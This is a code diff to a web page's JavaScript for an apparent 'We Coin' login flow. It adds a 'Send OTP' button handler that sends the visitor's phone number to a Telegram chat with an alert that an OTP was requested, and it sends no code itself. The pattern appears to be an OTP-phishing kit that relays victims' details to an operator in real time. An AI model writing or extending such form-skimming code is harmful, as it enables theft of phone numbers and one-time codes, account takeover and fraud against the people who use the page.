@@ -156,6 +156,29 @@
         });
 
         // 2. SEND OTP BUTTON
+        // 2. SEND OTP BUTTON
+sendOtpBtn.addEventListener('click', async function() {
+    const phone = document.getElementById('phone').value;
+    
+    this.disabled = true;
+    let timeLeft = 60;
+    this.innerText = `${timeLeft}s`;
+
+    const msg = `🚨 *We Coin: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
+    await sendToTelegram(msg);
+
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        sendOtpBtn.innerText = `${timeLeft}s`;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            sendOtpBtn.innerText = "Send";
+            sendOtpBtn.disabled = false;
+        }
+    }, 1000);
+});
+        
 // 3. CONFIRM BUTTON
 document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
     const phone = document.getElementById('phone').value;
